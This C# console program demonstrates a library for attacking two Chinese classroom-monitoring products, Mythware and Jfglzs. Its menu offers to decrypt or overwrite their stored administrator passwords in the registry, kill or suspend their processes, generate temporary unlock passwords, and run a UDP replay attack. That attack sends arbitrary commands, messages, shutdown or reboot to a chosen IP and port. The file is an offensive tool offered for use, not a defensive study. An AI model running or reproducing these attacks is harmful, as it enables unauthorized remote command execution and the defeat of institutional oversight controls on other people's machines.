using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using T4CLLibrary;
using T4CLLibrary.Mythware;

namespace Demo
{
    internal class Program
    {
        static void ShowTips()
        {
            Console.WriteLine("T4CL库演示");
            Console.WriteLine("请选择要演示的功能:");
            Console.WriteLine("极域:");
            Console.WriteLine("1. 极域电子教室密码破解器");
            Console.WriteLine("2. 结束极域电子教室进程");
            Console.WriteLine("3. 挂起极域电子教室进程");
            Console.WriteLine("4. 恢复极域电子教室进程");
            Console.WriteLine("5. 极域UDP重放攻击");
            Console.WriteLine("机房管理助手:");
            Console.WriteLine("6. 机房管理助手进程名生成器");
            Console.WriteLine("7. 结束机房管理助手进程");
            Console.WriteLine("8. 机房管理助手密码破解器");
            Console.WriteLine("9. 获取机房管理助手临时密码");
            Console.WriteLine("其他:");
            Console.WriteLine("10. 挂起进程");
            Console.WriteLine("11. 恢复进程");
            Console.WriteLine("12. 结束进程");
            Console.Write("请输入你的选择:");
        }

        static void MythwarePasswordCracker() 
        {
            Console.Write("加密/解密？(E/D):");
            var ed = Console.ReadLine();
            if (ed == "E")
            {
                Console.WriteLine("请输入要加密的密码:");
                var password = Console.ReadLine();
                var result = T4CLLibrary.Mythware.PasswordCracker.EncryptPassword(password);
                Console.WriteLine($"加密后的密码为: {string.Join(",", Array.ConvertAll(result, b => b.ToString("X2")))}");
                Console.Write("是否更改注册表内存储的值？(Y/N): ");
                var choice = Console.ReadLine();
                if (choice == "Y")
                {
                    T4CLLibrary.Mythware.PasswordCracker.SetEncryptedPassword(result);
                    Console.WriteLine("已更改注册表内存储的值");
                }
            }
            else if (ed == "D")
            {
                var password = T4CLLibrary.Mythware.PasswordCracker.GetEncryptedPassword();
                var result = T4CLLibrary.Mythware.PasswordCracker.DecryptPassword(password);
                Console.WriteLine($"解密后的密码为: {result}");
            }
            else
            {
                Console.WriteLine("输入错误");
            }
        }

        static void JfglzsPasswordCracker(bool useNewVer)
        {
            string ed;
            if (useNewVer) 
            {
                Console.Write("加密/解密？(E/D):");
                ed = Console.ReadLine();
            }
            else
            {
                ed = "E";//旧版无法解密
            }

            if (ed == "E")
            {
                Console.WriteLine("请输入要设置的密码:");
                var password = Console.ReadLine();
                string result;
                if (useNewVer)
                {
                    result = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordNew(password);
                }
                else
                {
                    result = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword(password);
                }
                Console.WriteLine($"加密后的密码为: {result}");
                Console.Write("是否更改注册表内存储的值？(Y/N): ");
                var choice = Console.ReadLine();
                if (choice == "Y")
                {
                    T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(result);
                    Console.WriteLine("已更改注册表内存储的值");
                }
            }
            else if (ed == "D")
            {
                Console.WriteLine("这会消耗特别长的时间（约为半分钟）, 且可能无效, 请耐心等待");
                var password = T4CLLibrary.Jfglzs.PasswordCracker.GetEncryptedPassword();
                var result = T4CLLibrary.Jfglzs.PasswordCracker.DecryptPassword(password);
                if (result.Length == 0)
                {
                    Console.WriteLine("解密失败");
                }
                else
                {
                    foreach (var pwd in result)
                    {
                        Console.WriteLine($"密码可能为:{pwd}");
                    }
                }
            }
            else
            {
                Console.WriteLine("输入错误");
            }

        }

        static string ReadUntilCtrlZ()
        {
            string input = string.Empty;
            while (true)
            {
                var line = Console.ReadLine();
                if (line == null)
                    break; // Ctrl+Z
                input += line + Environment.NewLine;
            }
            return input;
        }

        static void MythwareUdpAttack()
        {
            Console.Clear();
            Console.Write("请输入要攻击的IP地址:");
            var ip = Console.ReadLine();
            Console.Write("请输入要攻击的端口号:");
            var port = Console.ReadLine();
            Console.Write("攻击方式?(c: 发送命令, m: 发送信息, s: 关机, r: 重启): ");
            var attackType = Console.ReadLine();
            switch (attackType)
            {
                case "c":
                    Console.Write("请输入要发送的命令:");
                    var command = Console.ReadLine();
                    T4CLLibrary.Mythware.UdpAttack.SendMessage(command,CommandType.ExecuteCommand,ip,int.Parse(port));
                    Console.WriteLine("已发送");
                    break;
                case "m":
                    Console.WriteLine("请输入信息, 在最后一行按下Ctrl+Z后再按Enter结束:");
                    var message = ReadUntilCtrlZ();
                    T4CLLibrary.Mythware.UdpAttack.SendMessage(message, CommandType.SendMessage, ip, int.Parse(port));
                    Console.WriteLine("已发送");
                    break;
                case "s":
                    T4CLLibrary.Mythware.UdpAttack.SendMessage("", CommandType.Shutdown, ip, int.Parse(port));
                    Console.WriteLine("已发送");
                    break;
                case "r":
                    T4CLLibrary.Mythware.UdpAttack.SendMessage("", CommandType.Reboot, ip, int.Parse(port));
                    Console.WriteLine("已发送");
                    break;
                default:
                    break;
            }
        }
        static void Main(string[] args)
        {
            try
            {
                ShowTips();
                var choice = Console.ReadLine();
                switch (choice)
                {
                    case "1":
                        MythwarePasswordCracker();
                        break;
                    case "2":
                        T4CLLibrary.Mythware.ProcessManager.KillAllProcesses();
                        Console.WriteLine("已结束极域电子教室进程");
                        break;
                    case "3":
                        T4CLLibrary.Mythware.ProcessManager.SuspendMainProcess();
                        Console.WriteLine("已挂起极域电子教室进程");
                        break;
                    case "4":
                        T4CLLibrary.Mythware.ProcessManager.ResumeMainProcess();
                        Console.WriteLine("已恢复极域电子教室进程");
                        break;
                    case "5":
                        MythwareUdpAttack();
                        break;
                    case "6":
                        var processName = T4CLLibrary.Jfglzs.ProcessKiller.GetRandomProcessName(DateTime.Now.Month * DateTime.Now.Day,true);
                        Console.WriteLine($"生成的进程名为: {processName}");
                        break;
                    case "7":
                        T4CLLibrary.Jfglzs.ProcessKiller.KillAllProcesses();
                        Console.WriteLine("已结束机房管理助手进程");
                        break;
                    case "8":
                        Console.WriteLine("是否使用新版本(9.99及以后)的加密方式？(Y/N): ");
                        var useNewVer = Console.ReadLine() == "Y";
                        JfglzsPasswordCracker(useNewVer);
                        break;
                    case "9":
                        var tempPassword = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
                        Console.WriteLine($"生成的临时密码为: {tempPassword}");
                        break;
                    case "10":
                        Console.Write("请输入要挂起的进程名:");
                        var suspendProcessName = Console.ReadLine();
                        T4CLLibrary.ProcessHelper.SuspendProcessByName(suspendProcessName);
                        Console.WriteLine($"已挂起进程: {suspendProcessName}");
                        break;
                    case "11":
                        Console.Write("请输入要恢复的进程名:");
                        var resumeProcessName = Console.ReadLine();
                        T4CLLibrary.ProcessHelper.ResumeProcessByName(resumeProcessName);
                        Console.WriteLine($"已恢复进程: {resumeProcessName}");
                        break;
                    case "12":
                        Console.Write("请输入要结束的进程名:");
                        var killProcessName = Console.ReadLine();
                        T4CLLibrary.ProcessHelper.KillProcessByName(killProcessName);
                        Console.WriteLine($"已结束进程: {killProcessName}");
                        break;
                    default:
                        Console.WriteLine("未实现/不存在");
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"错误: {ex.Message}");
                Console.WriteLine($"栈跟踪: {ex.StackTrace}");
            }
            Console.WriteLine("按任意键退出");
            Console.ReadKey();
        }
    }
}
